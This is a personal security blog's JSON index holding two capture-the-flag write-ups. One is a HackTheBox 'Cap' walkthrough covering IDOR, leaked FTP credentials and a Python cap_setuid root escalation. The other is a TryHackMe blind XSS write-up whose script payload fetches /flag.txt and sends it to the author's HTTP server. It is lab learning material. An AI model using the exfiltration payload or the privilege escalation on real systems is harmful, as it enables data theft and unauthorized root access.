
[{"content":"Advanced penetration testing labs with a gamified approach. Earn points by completing challenges and compete with other security professionals.\n","date":"26 February 2025","externalUrl":null,"permalink":"/writeups/hackthebox/","section":"WriteUps","summary":"Write-ups for HackTheBox Challanges \u0026amp; Machines","title":"HackTheBox","type":"writeups"},{"content":"Welcome to my TryHackMe Writeups! Here, I document my solutions and learnings from TryHackMe rooms. Explore the writeups below to level up your skills.\n","date":"30 November 2024","externalUrl":null,"permalink":"/writeups/tryhackme/","section":"WriteUps","summary":"Write-ups for HackTheBox Challanges \u0026amp; Machines","title":"Tryhackme","type":"writeups"},{"content":"Capture the Flag (CTF) in computer security is an exercise in which participants attempt to find text strings, called \u0026ldquo;flags\u0026rdquo;, which are secretly hidden in purposefully-vulnerable programs or websites.\n","externalUrl":null,"permalink":"/writeups/ctf/","section":"WriteUps","summary":"Write-ups for CTF Challanges","title":"CTF","type":"writeups"},{"content":" Cap (Linux) # Link: https://app.hackthebox.com/machines/Cap Difficulty Easy Machine Linux Enumeration # Nmap scan # └──╼ $sudo rustscan -a cap.htb -- -A 21/tcp open ftp syn-ack vsftpd 3.0.3 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0= | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI= | 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d: de :b3:de:b2:18 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH 80/tcp open http syn-ack gunicorn | http-methods: |_ Supported Methods: OPTIONS GET HEAD |_http-server-header: gunicorn |_http-title: Security Dashboard | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND | Server: gunicorn | Date: Wed, 26 Feb 2025 07:42:36 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 232 | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 3.2 Final//EN\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\u0026lt;/p\u0026gt; | GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Wed, 26 Feb 2025 07:42:28 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 19386 | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html class=\u0026#34;no-js\u0026#34; lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;x-ua-compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Security Dashboard\u0026lt;/title\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;/static/images/icon/favicon.ico\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/themify-icons.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/metisMenu.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/owl.carousel.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/slicknav.min.css\u0026#34;\u0026gt; | \u0026lt;!-- amchar | HTTPOptions: | HTTP/1.0 200 OK | Server: gunicorn | Date: Wed, 26 Feb 2025 07:42:29 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Allow: OPTIONS, GET, HEAD | Content-Length: 0 | RTSPRequest: | HTTP/1.1 400 Bad Request | Connection: close | Content-Type: text/html | Content-Length: 196 | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;Bad Request\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;\u0026lt;p\u0026gt;Bad Request\u0026lt;/p\u0026gt;\u0026lt;/h1\u0026gt; | Invalid HTTP Version \u0026amp;#x27;Invalid HTTP Version: \u0026amp;#x27;RTSP/1.0\u0026amp;#x27;\u0026amp;#x27; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; Based on the OpenSSH and Apache versions. The Os is likely a Ubuntu Focal 20.04.\nThere was no anonymous login from NMAP so i tried manually but didn’t work Tried for Vhosts fuzzing too but no results were found so i moved onto look out the website for it’s funtionality.\nWebsite Features # Port(80) # The website appears to be a security dashboard. A user named \u0026ldquo;nathan\u0026rdquo; is already logged in. Navigating to Security Snapshots leads to /capture and redirects to /data/4.\nIP Config Page: Displays the output of /ipconfig. Network Status Page: Displays the output of /netstat. Directory Bruteforcing # Using dirsearch, the following endpoints were found:\n❯ dirsearch -u http://cap.htb _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Target: http://cap.htb/ [14:15:19] Starting: [14:17:50] 302 - 208B - /data/adminer.php -\u0026gt; http://cap.htb/ [14:17:50] 302 - 208B - /data -\u0026gt; http://cap.htb/ [14:17:50] 302 - 208B - /data/autosuggest -\u0026gt; http://cap.htb/ [14:17:59] 302 - 208B - /download/history.csv -\u0026gt; http://cap.htb/ [14:17:59] 302 - 208B - /download/users.csv -\u0026gt; http://cap.htb/ IDOR # Observing /data/4, I tested for an IDOR vulnerability by iterating through numbers and found that all values returned .pcap files.\nBut one file contained the FTP user credentials leak for the nathan user after going through of the pcap file from( /data/0 )\nnathan:Buck3tH4TF0RM3! I quickly tried the leaked credentials in the ftp and got the user flag .\n└──╼ $ftp cap.htb Connected to cap.htb. 220 (vsFTPd 3.0.3) Name (cap.htb:rorymercury): nathan 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; dir 229 Entering Extended Passive Mode (|||43215|) 150 Here comes the directory listing. drwxr-xr-x 3 1001 1001 4096 Mar 29 07:03 snap -r-------- 1 1001 1001 33 Mar 29 06:50 user.txt 226 Directory send OK. ftp\u0026gt; get user.txt local: user.txt remote: user.txt 229 Entering Extended Passive Mode (|||22600|) 150 Opening BINARY mode data connection for user.txt (33 bytes). 100% |***********************************| 33 255.76 KiB/s 00:00 ETA 226 Transfer complete. 33 bytes received in 00:00 (0.42 KiB/s) ftp\u0026gt; exit 221 Goodbye. └──╼ $cat user.txt 2e1db9900cd9fc2a66c97********** SSH # Attempting password reuse, I successfully logged into SSH as nathanwith same password.\nShell as root # Enumeration # Running LinPEAS revealed that python3.8 had the capability cap_setuid+ep, we can abuse.\nAbusing Capabilities # I will abuse thecap_setuid to change the current user id of the current process to else with the helpful guide .\nAbusing-Linux-capabilities\none of the capabilites the linpeas found was python with the cap_setuid , which seems to allow us to change the user id for this process and make ourself root\nnathan@cap:/tmp$ getcap -r / 2\u0026gt;/dev/null /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip /usr/bin/ping = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep nathan@cap:/tmp$ python3.8 Python 3.8.5 (default, Jan 27 2021, 15:41:15) [GCC 9.3.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import os \u0026gt;\u0026gt;\u0026gt; os.setuid(0) \u0026gt;\u0026gt;\u0026gt; os.system(\u0026#34;/bin/bash\u0026#34;) root@cap:/tmp# Root Flag # root@cap:/root# cat root.txt d19f2b2f2ebe40ace3************** Summary # Enumeration: Found FTP, SSH, and a web application with IDOR. Exploitation: Retrieved FTP credentials via .pcap file. Privilege Escalation: Used Python capabilities to escalate to root. ","date":"26 February 2025","externalUrl":null,"permalink":"/writeups/hackthebox/cap/","section":"WriteUps","summary":"Cap (Linux) # Link: https://app.","title":"Cap Writeup - HackTheBox","type":"writeups"},{"content":"","date":"26 February 2025","externalUrl":null,"permalink":"/","section":"DarknessE1","summary":"","title":"DarknessE1","type":"page"},{"content":"","date":"26 February 2025","externalUrl":null,"permalink":"/tags/easy/","section":"Tags","summary":"","title":"Easy","type":"tags"},{"content":"","date":"26 February 2025","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"HackTheBox","type":"tags"},{"content":"","date":"26 February 2025","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"26 February 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"A stash of write-ups dissecting challenges, exploits, and machines—sorted by the platforms they were dropped on.\n","date":"26 February 2025","externalUrl":null,"permalink":"/writeups/","section":"WriteUps","summary":"A stash of write-ups dissecting challenges, exploits, and machines—sorted by the platforms they were dropped on.","title":"WriteUps","type":"list"},{"content":"Firstly, I navigated through and found two sections: HOME and FEEDBACK. When I clicked HOME, it didn\u0026rsquo;t do anything and felt like a static page. When I went to the FEEDBACK page, I found that I could send feedback. So, first, I tried sending some feedback.\nBefore beginning the room, the challenge said to access http://10.10.175.14:8080/flag.txt. So, I visited that path, but I was greeted with a 401 Unauthorized error. So, I came back to the FEEDBACK section to look through what I could do! I tried HTML tags first, but I didn\u0026rsquo;t get anything on the page. Then I noticed the message we got after sending feedback: It will be evaluated shortly by our staff. Suddenly, I thought, what if I send malicious payload throught it . Their will be high chances someone with higher privileges reviewed the malicious payload I sent? The answer would be that it would get executed, right? So, I thought, why not try Blind XSS? I went and looked for Blind XSS payloads on GitHub and found one. I crafted it specifically for my needs.\nBefore starting, I set up a Python HTTP server, which hosted on the default port 8000 using the command:\npython -m http.server Before trying the payload, I checked my IP using ipconfig. Then, I tried some payloads using my Python HTTP server, and I got a hit. The command I used was:\n\u0026#39;\u0026#34;\u0026gt;\u0026lt;script src=http://10.17.32.192:8000/script-tag\u0026gt;\u0026lt;/script\u0026gt; We successfully got a request hit! So now, I tried figuring out how I could read the file. After some tries, I crafted a specific payload, and it looked like this:\n\u0026#34;\u0026gt;\u0026lt;script\u0026gt; fetch(\u0026#39;/flag.txt\u0026#39;) // Access the restricted file using a relative path .then(response =\u0026gt; response.text()) .then(data =\u0026gt; { fetch(\u0026#39;http://10.17.32.192:8000/?flag=\u0026#39; + encodeURIComponent(data)); }); \u0026lt;/script\u0026gt; And I got the flag! But still, there was some work to do before submitting the flag. The flag was URL-encoded! I quickly searched for URL DECODER and found the site: https://meyerweb.com/eric/tools/dencoder/. Using that, I decoded the flag. The final flag looked like this: ","date":"30 November 2024","externalUrl":null,"permalink":"/writeups/tryhackme/sticker-shop/","section":"WriteUps","summary":"Firstly, I navigated through and found two sections: HOME and FEEDBACK.","title":"Sticker Shop Writeup","type":"writeups"},{"content":"","date":"30 November 2024","externalUrl":null,"permalink":"/tags/tryhackme/","section":"Tags","summary":"","title":"TryHackMe","type":"tags"},{"content":"Hi, I\u0026rsquo;m Kiran Dhimal (DarknessE1), a passionate cybersecurity enthusiast. I specialize in web application penetration testing, ethical hacking, and CTF challenges. Always eager to learn, I continuously explore new aspects of cybersecurity to expand my skills and hands-on experience.\nLearning \u0026amp; Development # Active Learning: I continuously enhance my skills by engaging with platforms such as HackTheBox and TryHackMe, where I tackle various challenges and simulations. CTF Participation: I actively participate in Capture The Flag (CTF) competitions as a member of the team NCA@NEPAL, which enables me to test my skills and collaborate with like-minded professionals. Skills # Web Application Penetration Testing: Identifying vulnerabilities and securing web applications. OSINT (Open Source Intelligence): Leveraging publicly available information for cybersecurity investigations. CTF Challenges: Competing in and solving complex challenges in the cybersecurity realm. Badges and Profiles # TryHackMe Profile: DarknessE1 Hack The Box Profile: DarknessE1 Goals # Short Term: To gain hands-on experience and earn certifications such as CBBH and CPTS through platforms like HackTheBox. Long Term: To contribute to the cybersecurity community by helping create safer digital environments. I am dedicated to continuous improvement and eager to contribute to the field of cybersecurity through both individual efforts and collaborative challenges.\n","externalUrl":null,"permalink":"/about-me/","section":"About-Me","summary":"Hi, I\u0026rsquo;m Kiran Dhimal (DarknessE1), a passionate cybersecurity enthusiast.","title":"About-Me","type":"About-Me"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"Peek into my research posts, where I break down fresh vulnerabilities, unravel how they work, and drop my own discoveries.\n","externalUrl":null,"permalink":"/research/","section":"Research","summary":"Peek into my research posts, where I break down fresh vulnerabilities, unravel how they work, and drop my own discoveries.","title":"Research","type":"list"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]